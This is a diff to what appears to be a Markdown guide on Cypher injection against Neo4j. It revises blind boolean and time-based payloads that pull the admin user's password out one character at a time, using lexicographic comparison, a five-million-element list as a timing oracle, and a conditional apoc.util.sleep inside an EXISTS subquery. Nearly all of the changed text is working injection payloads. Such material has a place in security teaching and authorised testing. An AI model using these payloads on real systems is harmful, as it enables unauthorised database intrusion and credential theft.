@@ -38,10 +38,10 @@ Extract a value character by character with `substring` and comparison. Each req
 
 ```
 ' OR substring(head([ (u:User {name:'admin'}) | u.password ]),0,1) = 'a' //
-' OR toInteger(substring(head([ (u:User) | u.password ]),0,1)) > 109 //
+' OR substring(head([ (u:User {name:'admin'}) | u.password ]),0,1) < 'm' //
 ```
 
-Comparison operators (`>`, `<`) drive a binary search over the character set, cutting the request count per character to a handful. `size()` on a comprehension yields counts (how many users, how long a property is) that guide the walk:
+Compare the single-character substring **lexicographically** with `>` and `<` (string comparison, not numeric: `toInteger('a')` returns null). That drives a binary search over the character set, cutting the request count per character to a handful. `size()` on a comprehension yields counts (how many users, how long a property is) that guide the walk:
 
 ```
 ' OR size(head([ (u:User {name:'admin'}) | u.password ])) = 12 //
@@ -49,21 +49,20 @@ Comparison operators (`>`, `<`) drive a binary search over the character set, cu
 
 ## Time-based inference
 
-Where both responses look identical, make the condition control a delay instead. APOC's `apoc.util.sleep()` pauses for a given number of milliseconds; gate it behind the condition so a slow response means true and a fast one means false:
+Where both responses look identical, make the condition control how long the query runs. The portable approach forces expensive computation on the true branch only, so a true condition answers measurably slower:
 
 ```
-' OR CASE WHEN 1=1 THEN apoc.util.sleep(3000) ELSE 0 END //
 ' OR CASE WHEN substring(head([ (u:User {name:'admin'}) | u.password ]),0,1)='a'
-     THEN apoc.util.sleep(3000) ELSE 0 END //
+     THEN size([ x IN range(1,5000000) | x ]) ELSE 0 END > -1 //
 ```
 
-`CASE WHEN ... THEN ... ELSE ... END` is Cypher's conditional; only the true branch sleeps. Where APOC is unavailable, force work proportional to a condition instead, for example an expensive Cartesian product or a large `range()` unwind that only executes when the predicate holds:
+`CASE WHEN ... THEN ... ELSE ... END` is Cypher's conditional, and only the true branch builds the five-million-element list, so it runs far slower than the trivial branch. This needs no extensions.
+
+Where APOC is present, `apoc.util.sleep()` gives a cleaner fixed delay, but it is a **procedure**: it must be invoked with `CALL` and cannot be returned from a `CASE` expression. Gate it with a conditional `CALL` in a subquery so only the matching case sleeps:
 
 ```
-' OR CASE WHEN 1=1 THEN size([ x IN range(1,5000000) | x ]) ELSE 0 END > -1 //
+' OR EXISTS { MATCH (u:User {name:'admin'}) WHERE substring(u.password,0,1)='a' CALL apoc.util.sleep(3000) RETURN 1 } //
 ```
-
-The computed branch takes measurably longer than the trivial branch, giving the same timing oracle without APOC.
 
 ## Driving it
 
